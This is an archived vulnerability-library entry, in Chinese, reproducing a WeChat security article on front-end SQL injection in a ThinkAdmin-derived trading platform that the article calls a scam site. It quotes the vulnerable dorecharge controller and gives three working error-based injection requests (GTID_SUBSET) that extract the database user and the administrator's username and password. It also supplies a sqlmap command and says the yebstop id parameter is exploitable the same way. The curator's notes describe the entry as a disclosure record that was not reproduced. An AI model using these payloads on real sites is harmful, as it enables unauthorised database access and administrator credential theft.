---
source: "gelusus/wxvl 公众号漏洞文库"
title: "未命名八语微盘系统（ThinkAdmin派生） dorecharge type SQL 注入，另称yebstop id SQL 注入"
product: "未命名八语微盘系统（ThinkAdmin派生）"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，MySQL GTID_SUBSET，Debug=True影响报错可见性"
prerequisites: "前台普通用户登录，源码有uid检查"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%AF%88%E9%AA%97%E5%BE%AE%E7%9B%98/%E6%9F%90%E8%AF%88%E9%AA%97%E5%BE%AE%E7%9B%98%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-40ec41f6f8bba0495e2953a2"
entity_id: "ve-40ec41f6f8bba0495e2953a2"
schema_version: "1"
---

# 未命名八语微盘系统（ThinkAdmin派生） dorecharge type SQL 注入，另称yebstop id SQL 注入

## 条目说明

- 对象与具体问题：未命名八语微盘系统（ThinkAdmin派生）；dorecharge type SQLi，另称yebstop id SQLi
- 版本、配置及部署条件：版本未知，MySQL GTID_SUBSET，Debug=True影响报错可见性
- 认证与权限前提：前台普通用户登录，源码有uid检查
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 源码清晰展示where原样拼接type，属于应用控制器漏洞不可归ThinkAdmin本体普遍漏洞
- 三个HTTP请求全部塌为单行且Content-Length静态，需恢复结构；源码压成一行但语义可读
- dorecharge后续会插充值订单，检测可能写业务记录；yebstop副作用也需说明
- yebstop只有一句无代码/请求，拆独立待补实体；数据库fast等为实验环境
- 6.5k资产无时间方法，FOFA实际被引流隐藏非已给指纹；诈骗定性无独立核验，保留来源限定
- 缺影响/修复版本和上游修补链接

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

原创 Mstir  星悦安全   2025-07-21 06:40  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
### 0x00 前言  
  
某八国语言微盘杀猪盘，前台一般可以直接注册开户，类似交易所，杠杆，后台一堆功能，用户钱包，提现，关系网，系统管理，Fofa量还挺大的，有6.5k  
  
**fofa指纹 : 在文末!**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwXEalmXLlib31pdaAZrGKuZEnyeQlLy12VBYQvmb3Z3YRyCicrQJ2lbibA/640?wx_fmt=png&from=appmsg "")  
  
前端:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwiaHutrNB2GHpC450iaxfJiazlia252I0xNA8DxicXPEpe3jYKSXeojqyyPw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujweYckorEUjIRc9IHoGRBKibTzMk2JnianicrxapI8ibTThhvuAqYY0vXvxA/640?wx_fmt=other&from=appmsg "")  
  
后端:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwhjnphG0ZF8oQCSr02mwAnwFhl4tEWxVDibs3HXVq97XKEIttl9aIaqA/640?wx_fmt=png&from=appmsg "")  
  
框架:ThinkAdmin Debug:True  
### 0x01 漏洞分析&复现  
  
**需前台普通用户登录**  
  
**位于 /application/index/controller/User.php 控制器的 dorecharge 方法，通过POST传入type参数，直接进入SQL查询字句，导致漏洞产生.**  
  
```
public function dorecharge(){  $uid = $this->app->session->get('uid');if(!$uid) $this->redirect('/index/login');if($this->app->request->isPost()){    $payments=Db::table('lc_payments')->where('id = '.$_POST['type'])->find();    $userinfo = Db::name('LcUser')->find($uid);    $orderid="CZ".$uid.$payments['title'].date('YmdHis',time()).mt_rand(10,99);    $add = array(      'orderid' => $orderid,      'uid' => $uid,      'money' => $_POST['money'],      'type' => $payments['title'],      'status' => 0,      'reason' => "用户前台充值",      'time' => date('Y-m-d H:i:s'),      'time2' => '0000-00-00 00:00:00'    );    $re = Db::name('LcRecharge')->insertGetId($add);    if($re){      $ok=array(        'code'=>1,        'info'=>lang('tips_do_success')      );return $ok;die;    }else{      $ok=array(        'code'=>0,        'info'=>lang('tips_do_failed').lang('key_contact_cs')      );return $ok;die;    }  }}
```  
  
Payload:  
```http
POST /index/user/dorecharge HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: max-age=0Connection: keep-aliveContent-Length: 17Content-Type: application/x-www-form-urlencodedCookie: think_var=hk; s47696c33=mp6s4pmvbpa4nqluhbdr7d3pvcHost: 192.168.140.128Origin: http://192.168.140.128Referer: http://192.168.140.128/index/user/dorechargeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36type=GTID_SUBSET(CONCAT((SELECT (USER()))),2235)&money=1222
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwpDdr2Z1CDlxrCg5pp0omLeo0tcdqmnGflxapn15E8qvr3fgzqMH6Ig/640?wx_fmt=other&from=appmsg "")  
跑出管理员账户：  
```http
POST /index/user/dorecharge HTTP/1.1Content-Length: 154Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedCookie: s47696c33=9v1raoo6lcnhpshrs9p1elfr82; think_var=hkHost: 192.168.140.128Origin: http://192.168.140.128Referer: http://192.168.140.128/index/user/dorechargeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36Connection: closetype=GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(username AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)&money=1222
```  
  
跑出管理员密码：  
```http
POST /index/user/dorecharge HTTP/1.1Content-Length: 154Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedCookie: s47696c33=9v1raoo6lcnhpshrs9p1elfr82; think_var=hkHost: 192.168.140.128Origin: http://192.168.140.128Referer: http://192.168.140.128/index/user/dorechargeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36Connection: closetype=GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(password AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)&money=1222
```  
  
  
**Python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
  
****  
****  
**在 yebstop 方法，id 参数同样存在注入，Payload相同，不再详写.**  
  
****  
****  
**投资需谨慎，谨防杀猪盘 !!!**  
  
### 0x02 Fofa指纹  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**关注公众号，发送 250721 获取Fofa指纹!**  
  
****  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
